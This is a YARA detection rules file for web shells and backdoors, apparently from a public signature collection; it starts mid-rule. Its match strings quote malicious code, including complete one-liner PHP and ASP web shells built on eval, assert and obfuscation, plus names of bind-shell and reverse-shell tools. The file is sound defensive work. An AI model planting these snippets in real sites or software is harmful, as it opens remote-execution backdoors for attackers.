		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
		$s7 = "//http://require.duapp.com/session.php" fullword
		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
		$s12 = "//define('pass','123456');" fullword
		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
	condition:
		1 of them
}
rule webshell_webshells_new_JSP {
	meta:
		description = "Web shells - generated from file JSP.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "495f1a0a4c82f986f4bdf51ae1898ee7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
		$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
		$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
	condition:
		1 of them
}
rule webshell_webshell_123 {
	meta:
		description = "Web shells - generated from file webshell-123.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014-03-28"
		modified = "2023-01-27"
		score = 70
		hash = "2782bb170acaed3829ea9a04f0ac7218"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "// Web Shell!!" fullword
		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
		$s3 = "$default_charset = \"UTF-8\";" fullword
		$s4 = "// url:http://www.weigongkai.com/shell/"
	condition:
		2 of them
}
rule webshell_dev_core {
	meta:
		description = "Web shells - generated from file dev_core.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "55ad9309b006884f660c41e53150fc2e"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
		$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
		$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
		$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
		$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
		$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
	condition:
		1 of them
}
rule webshell_webshells_new_pHp {
	meta:
		description = "Web shells - generated from file pHp.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "b0e842bdf83396c3ef8c71ff94e64167"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
	condition:
		1 of them
}
rule webshell_webshells_new_pppp {
	meta:
		description = "Web shells - generated from file pppp.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "cf01cb6e09ee594545693c5d327bdd50"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Mail: chinese@hackermail.com" fullword
		$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
		$s6 = "Site: http://blog.weili.me" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_code {
	meta:
		description = "Web shells - generated from file code.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "a444014c134ff24c0be5a05c02b81a79"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
	condition:
		1 of them
}
rule webshell_webshells_new_jspyyy {
	meta:
		description = "Web shells - generated from file jspyyy.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
	condition:
		all of them
}
rule webshell_webshells_new_xxxx {
	meta:
		description = "Web shells - generated from file xxxx.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "5bcba70b2137375225d8eedcde2c0ebb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php eval($_POST[1]);?>  " fullword
	condition:
		all of them
}
rule webshell_webshells_new_JJjsp3 {
	meta:
		description = "Web shells - generated from file JJjsp3.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "949ffee1e07a1269df7c69b9722d293e"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
	condition:
		all of them
}
rule webshell_webshells_new_PHP1 {
	meta:
		description = "Web shells - generated from file PHP1.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
	condition:
		1 of them
}
rule webshell_webshells_new_JJJsp2 {
	meta:
		description = "Web shells - generated from file JJJsp2.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "5a9fec45236768069c99f0bfd566d754"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
	condition:
		1 of them
}
rule webshell_webshells_new_radhat {
	meta:
		description = "Web shells - generated from file radhat.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "72cb5ef226834ed791144abaa0acdfd4"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "sod=Array(\"D\",\"7\",\"S"
	condition:
		all of them
}
rule webshell_webshells_new_asp1 {
	meta:
		description = "Web shells - generated from file asp1.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "b63e708cd58ae1ec85cf784060b69cad"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_php6 {
	meta:
		description = "Web shells - generated from file php6.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "ea75280224a735f1e445d244acdfeb7b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "array_map(\"asx73ert\",(ar"
		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
		$s4 = "shell.php?qid=zxexp  " fullword
	condition:
		1 of them
}
rule webshell_webshells_new_xxx {
	meta:
		description = "Web shells - generated from file xxx.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
	condition:
		all of them
}
rule webshell_GetPostpHp {
	meta:
		description = "Web shells - generated from file GetPostpHp.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "20ede5b8182d952728d594e6f2bb5c76"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
	condition:
		all of them
}
rule webshell_webshells_new_php5 {
	meta:
		description = "Web shells - generated from file php5.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "cf2ab009cbd2576a806bfefb74906fdf"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
	condition:
		all of them
}
rule webshell_webshells_new_PHP {
	meta:
		description = "Web shells - generated from file PHP.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
		$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
		$s5 = " - ExpDoor.com</title>" fullword
		$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
		$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_Asp {
	meta:
		description = "Web shells - generated from file Asp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "32c87744ea404d0ea0debd55915010b7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
		$s2 = "Function MorfiCoder(Code)" fullword
		$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
	condition:
		1 of them
}

/* Update from hackers tool pack */

rule perlbot_pl {
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
		id = "378cb0e4-2069-50b7-ab3e-5a81055e9983"
	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"
	condition:
		1 of them
}
rule php_backdoor_php {
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		id = "aca53071-f793-538d-bbeb-34469cdb4d1f"
	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"
	condition:
		1 of them
}
rule Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php {
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		id = "e91114ce-18f9-51cd-b41c-b796960ea4fe"
	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
	condition:
		1 of them
}
rule Nshell__1__php_php {
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "973fc89694097a41e684b43a21b1b099"
		id = "44e8b6c5-6f41-5c37-a083-26acedd91956"
	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
	condition:
		1 of them
}
rule shankar_php_php {
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
		id = "0c8ab3eb-574b-5e5a-8117-4efecef94f83"
	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
	condition:
		1 of ($s*) and $sAuthor
}
rule Casus15_php_php {
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
		id = "ba6748a2-fb80-5eda-816c-155bab9285e5"
	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "
	condition:
		1 of them
}
rule small_php_php {
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
		id = "cf4fb88f-a312-560d-be0b-b55bfcb889be"
	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword
	condition:
		2 of them
}
rule shellbot_pl {
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
		id = "07c145b1-c9f7-564a-b354-a6d2072f380c"
	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
	condition:
		2 of them
}
rule fuckphpshell_php {
	meta:
		description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "554e50c1265bb0934fcc8247ec3b9052"
		id = "010db63b-ff72-5f97-8651-a1c7851471ff"
	strings:
		$s0 = "$succ = \"Warning! "
		$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
		$s2 = "\\*=-- MEMBERS AREA --=*/"
		$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
	condition:
		2 of them
}
rule ngh_php_php {
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
		id = "2d8ff3c1-d6b3-57ce-8213-232b376dbd05"
	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
	condition:
		1 of them
}
rule jsp_reverse_jsp {
	meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
		id = "4953b230-4cd9-55d6-a3cb-8d3713e7fb0c"
	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"
	condition:
		2 of them
}
rule Tool_asp {
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
		id = "e5e727bd-836b-5540-8755-40f37904bc03"
	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
	condition:
		2 of them
}
rule NT_Addy_asp {
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
		id = "18f5f360-8690-5e09-ac18-b8cc4f678811"
	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"
	condition:
		1 of them
}
rule SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php {
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		id = "8a34f4fd-337d-5eb4-b7b7-4adb1c2b7937"
	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
	condition:
		1 of them
}
rule RemExp_asp {
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		id = "900036ce-ff13-5441-bb77-906ea08a4ca0"
	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
	condition:
		2 of them
}
rule phvayvv_php_php {
	meta:
		description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "35fb37f3c806718545d97c6559abd262"
		id = "76351a59-8f52-5110-a9b8-36edd59026df"
	strings:
		$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
		$s1 = "$baglan=fopen($duzkaydet,'w');"
		$s2 = "PHVayv 1.0"
	condition:
		1 of them
}
rule klasvayv_asp {
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
		id = "3ca4c20c-f879-55a0-9070-d40fc903f9ae"
	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
	condition:
		1 of them
}
rule r57shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file r57shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d28445de424594a5f14d0fe2a7c4e94f"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
	strings:
		$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
		$s2 = "RusH security team"
		$s3 = "'ru_text12' => 'back-connect"
		$s4 = "<title>r57shell</title>"
	condition:
		1 of them
}
rule rst_sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
	condition:
		2 of them
}
rule wh_bindshell_py {
	meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "fab20902862736e24aaae275af5e049c"
		id = "b7acbfe7-fd28-5832-9af2-1c5befe4bbab"
	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword
	condition:
		1 of them
}
rule lurm_safemod_on_cgi {
	meta:
		description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5ea4f901ce1abdf20870c214b3231db3"
		id = "74e77260-a547-5553-8430-2620f8549f50"
	strings:
		$s0 = "Network security team :: CGI Shell" fullword
		$s1 = "#########################<<KONEC>>#####################################" fullword
		$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
	condition:
		1 of them
}
rule c99madshell_v2_0_php_php {
	meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d27292895da9afa5b60b9d3014f39294"
		id = "b0724920-dc1e-5819-a99b-618a9a7e1eca"
	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
	condition:
		all of them
}
rule backupsql_php_often_with_c99shell {
	meta:
		description = "Semi-Auto-generated  - file backupsql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
		$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
	condition:
		all of them
}
rule uploader_php_php {
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
		id = "62aa783b-f12f-5bb5-9d96-7aee1666788b"
	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
	condition:
		2 of them
}
rule telnet_pl {
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dd9dba14383064e219e29396e242c1ec"
		id = "be4de017-e929-5dd3-a60e-f187456b1a55"
	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "
	condition:
		all of them
}
rule w3d_php_php {
	meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
		id = "1a4e3c84-2d3b-5245-bccc-9a5f59b9fc17"
	strings:
		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"
	condition:
		2 of them
}
rule WebShell_cgi {
	meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
		id = "b768bb72-64e8-545a-9123-3d5889b58a82"
	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"
	condition:
		all of them
}
rule WinX_Shell_html {
	meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		id = "fe02d995-4375-5ce9-aabe-fae5d29278d3"
	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"
	condition:
		2 of them
}
rule Dx_php_php {
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		id = "67d0bccb-d39a-5e30-bdc0-801525ebddd7"
	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
	condition:
		1 of them
}
rule csh_php_php {
	meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
	condition:
		1 of them
}
rule pHpINJ_php_php {
	meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
		id = "7bf54ef4-a3d8-51c6-8db7-bf8947e992ed"
	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""
	condition:
		2 of them
}
